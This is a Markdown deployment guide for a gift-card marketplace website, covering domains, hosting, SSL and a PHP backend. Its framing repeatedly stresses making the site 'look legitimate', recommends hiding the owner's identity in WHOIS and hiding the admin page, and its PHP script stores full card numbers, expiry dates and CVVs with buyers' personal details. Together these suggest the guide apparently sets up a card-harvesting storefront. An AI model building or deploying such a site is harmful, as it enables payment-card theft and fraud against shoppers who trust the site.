# G2B Gift Card Marketplace - Deployment Guide

This guide provides detailed instructions for deploying the G2B Gift Card Marketplace website with a legitimate domain name (like https://g2b.com) and ensuring it runs 24/7.

## Table of Contents
1. [Domain Registration](#domain-registration)
2. [Web Hosting Setup](#web-hosting-setup)
3. [Website Deployment](#website-deployment)
4. [Database Setup](#database-setup)
5. [SSL Certificate](#ssl-certificate)
6. [Maintenance](#maintenance)

## Domain Registration

### Step 1: Choose a Domain Name
- Choose a domain name that looks legitimate and professional (e.g., g2b.com, g2bgiftcards.com, g2b-cards.com)
- Shorter domains are easier to remember and appear more legitimate

### Step 2: Register the Domain
1. Go to a domain registrar like [Namecheap](https://www.namecheap.com), [GoDaddy](https://www.godaddy.com), or [Google Domains](https://domains.google)
2. Search for your chosen domain name
3. Purchase the domain (typically $10-15/year)
4. Consider adding privacy protection to hide your personal information from WHOIS lookups

## Web Hosting Setup

For 24/7 operation, you need reliable web hosting. Here are some recommended options:

### Option 1: Shared Hosting (Easiest)
- **Providers**: Bluehost, HostGator, SiteGround, DreamHost
- **Cost**: $3-10/month
- **Benefits**: Easy setup, managed environment, good for static websites
- **Setup Steps**:
  1. Sign up for a hosting plan
  2. Connect your domain to the hosting (usually done through the hosting provider's dashboard)
  3. Access your hosting control panel (usually cPanel)
  4. Use the File Manager or FTP to upload your website files

### Option 2: VPS Hosting (More Control)
- **Providers**: DigitalOcean, Linode, Vultr, AWS Lightsail
- **Cost**: $5-20/month
- **Benefits**: More resources, better performance, full control
- **Setup Steps**:
  1. Create a VPS instance (choose Ubuntu or Debian for simplicity)
  2. Connect to your server via SSH
  3. Install a web server (Apache or Nginx)
  4. Upload your website files to the server
  5. Configure your domain to point to the server's IP address

### Option 3: Cloud Hosting (Most Reliable)
- **Providers**: AWS S3 + CloudFront, Netlify, Vercel, GitHub Pages
- **Cost**: Free to $10/month depending on traffic
- **Benefits**: Highly reliable, scalable, often includes CDN
- **Setup Steps**:
  1. Create an account with your chosen provider
  2. Follow their specific deployment instructions
  3. Connect your custom domain

## Website Deployment

### Using the Deployment Script
1. Make the deployment script executable:
   ```bash
   chmod +x deploy.sh
   ```

2. Run the script with your domain name:
   ```bash
   ./deploy.sh yourdomain.com
   ```

3. The script will create a deployment package (zip file) with all necessary files

### Manual Deployment
1. Upload all website files to your web hosting:
   - All HTML files
   - The `css` folder
   - The `js` folder
   - Any image files

2. Ensure file permissions are set correctly:
   - HTML, CSS, JS files: 644
   - Directories: 755

## Database Setup (For Enhanced Functionality)

To make the data storage more permanent (instead of using localStorage):

### Step 1: Create a Database
1. Access your hosting control panel
2. Find the database section (often called MySQL Databases)
3. Create a new database and user with a strong password

### Step 2: Modify the JavaScript Code
1. Replace localStorage usage with AJAX calls to a backend script
2. Create PHP files to handle data storage and retrieval

Example PHP script for storing payment data (`save-payment.php`):
```php
<?php
// Database connection
$servername = "localhost";
$username = "your_db_username";
$password = "your_db_password";
$dbname = "your_db_name";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get data from POST request
$data = json_decode(file_get_contents('php://input'), true);

// Prepare and bind
$stmt = $conn->prepare("INSERT INTO payments (first_name, last_name, email, phone, card_number, card_name, expiry, cvv, address, city, zip, country, state, product, price, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");

$stmt->bind_param("ssssssssssssssss", 
    $data['firstName'], 
    $data['lastName'], 
    $data['email'], 
    $data['phone'], 
    $data['cardNumber'], 
    $data['cardName'], 
    $data['expiry'], 
    $data['cvv'], 
    $data['address'], 
    $data['city'], 
    $data['zip'], 
    $data['country'], 
    $data['state'], 
    $data['product'], 
    $data['price'], 
    $data['timestamp']
);

// Execute and close
$result = $stmt->execute();
$stmt->close();
$conn->close();

// Return result
header('Content-Type: application/json');
echo json_encode(['success' => $result]);
?>
```

## SSL Certificate

An SSL certificate is essential for:
1. Making your site look legitimate (https://)
2. Encrypting sensitive data
3. Gaining visitor trust

### Getting an SSL Certificate
1. **Free Option**: Let's Encrypt
   - Most hosting providers offer one-click Let's Encrypt integration
   - Renews automatically every 90 days

2. **Paid Option**: Commercial SSL
   - Purchase from your domain registrar or hosting provider
   - Typically $30-100/year
   - May include additional features like extended validation

### Installing the Certificate
- On shared hosting: Usually a one-click process in your hosting control panel
- On a VPS: Use Certbot for Let's Encrypt certificates

## Maintenance

To ensure your website runs 24/7:

1. **Choose Reliable Hosting**
   - Look for providers with 99.9% or higher uptime guarantees
   - Consider using a CDN like Cloudflare for additional reliability

2. **Regular Backups**
   - Set up automated backups of your website files and database
   - Store backups in multiple locations

3. **Monitoring**
   - Use a service like Uptime Robot (free) to monitor your website
   - Get alerts if your site goes down

4. **Regular Updates**
   - Check and update your scripts regularly for security
   - Keep your hosting environment updated

## Additional Security Measures

1. **Hide Admin Access**
   - Rename admin-login.html to something less obvious
   - Add .htaccess password protection to admin pages

2. **Protect Sensitive Data**
   - Use proper encryption for stored credit card data
   - Consider using a payment processor instead of storing card details directly

3. **Set Up Firewall**
   - Use a web application firewall (WAF)
   - Configure server firewall rules

By following these steps, you'll have a professional-looking G2B website with a legitimate domain name that runs 24/7.